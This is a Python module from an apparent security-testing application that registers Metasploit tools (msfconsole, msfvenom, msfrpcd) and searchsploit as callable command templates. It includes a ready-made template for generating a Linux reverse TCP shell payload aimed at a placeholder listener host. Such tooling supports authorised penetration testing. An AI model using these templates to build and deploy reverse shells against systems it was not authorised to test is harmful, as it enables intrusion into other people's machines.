"""
Exploitation Tools Specifications
==================================

Metasploit, payload generation, post-exploitation.
"""
from typing import List
from app.tools.registry import ToolSpec, ToolCategory, CommandTemplate


def get_specs() -> List[ToolSpec]:
    """Get exploitation tool specifications."""
    return [
        # ─────────────────────────────────────────────────────────
        # MSFCONSOLE - Metasploit Framework Console
        # ─────────────────────────────────────────────────────────
        ToolSpec(
            name="msfconsole",
            category=ToolCategory.EXPLOIT,
            description="Metasploit Framework - exploitation and post-exploitation",
            executable_names=["msfconsole"],
            install_hint="apt install metasploit-framework",
            commands={
                # Run a single command
                "exec": CommandTemplate(
                    args=["-q", "-x", "{command}"],
                    timeout=300,
                    success_codes=[0]
                ),
                # Run from resource file
                "resource": CommandTemplate(
                    args=["-q", "-r", "{resource_file}"],
                    timeout=600,
                    success_codes=[0]
                ),
            }
        ),
        
        # ─────────────────────────────────────────────────────────
        # MSFVENOM - Payload Generator
        # ─────────────────────────────────────────────────────────
        ToolSpec(
            name="msfvenom",
            category=ToolCategory.EXPLOIT,
            description="Generate payloads for various platforms",
            executable_names=["msfvenom"],
            install_hint="apt install metasploit-framework",
            commands={
                "list_payloads": CommandTemplate(
                    args=["--list", "payloads"],
                    timeout=60,
                    success_codes=[0]
                ),
                "generate": CommandTemplate(
                    args=[
                        "-p", "{payload}",
                        "LHOST={lhost}",
                        "LPORT={lport}",
                        "-f", "{format}",
                        "-o", "{output}"
                    ],
                    timeout=120,
                    success_codes=[0]
                ),
                "generate_shell": CommandTemplate(
                    args=[
                        "-p", "linux/x64/shell_reverse_tcp",
                        "LHOST={lhost}",
                        "LPORT={lport}",
                        "-f", "elf",
                        "-o", "{output}"
                    ],
                    timeout=120,
                    success_codes=[0]
                ),
            }
        ),
        
        # ─────────────────────────────────────────────────────────
        # MSFRPC - Metasploit RPC API
        # ─────────────────────────────────────────────────────────
        ToolSpec(
            name="msfrpcd",
            category=ToolCategory.EXPLOIT,
            description="Metasploit RPC daemon for API access",
            executable_names=["msfrpcd"],
            install_hint="apt install metasploit-framework",
            commands={
                "start": CommandTemplate(
                    args=["-P", "{password}", "-S", "-a", "127.0.0.1"],
                    timeout=30,
                    success_codes=[0]
                ),
            }
        ),
        
        # ─────────────────────────────────────────────────────────
        # SEARCHSPLOIT - Exploit Database Search
        # ─────────────────────────────────────────────────────────
        ToolSpec(
            name="searchsploit",
            category=ToolCategory.EXPLOIT,
            description="Search Exploit-DB for known exploits",
            executable_names=["searchsploit"],
            install_hint="apt install exploitdb",
            commands={
                "search": CommandTemplate(
                    args=["{query}"],
                    timeout=30,
                    success_codes=[0]
                ),
                "search_json": CommandTemplate(
                    args=["--json", "{query}"],
                    timeout=30,
                    success_codes=[0],
                    output_format="json"
                ),
                "examine": CommandTemplate(
                    args=["--examine", "{exploit_id}"],
                    timeout=30,
                    success_codes=[0]
                ),
            }
        ),
    ]
